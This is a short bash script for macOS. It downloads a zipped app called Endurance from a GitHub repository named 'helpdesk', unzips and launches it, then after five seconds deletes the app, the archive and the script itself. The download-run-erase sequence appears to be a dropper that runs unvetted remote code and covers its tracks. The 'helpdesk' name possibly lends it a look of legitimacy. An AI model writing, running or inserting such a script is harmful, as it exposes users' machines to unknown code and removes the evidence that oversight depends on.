#!/bin/bash

curl https://raw.githubusercontent.com/daroan/helpdesk/master/Endurance.app.zip -o ~/Endurance.app.zip

unzip ~/Endurance.app.zip

rm -rf ~/Endurance.app.zip

open -a ~/Endurance.app

sleep 5

rm -rf ~/Endurance.app

rm ~/test.sh

exit
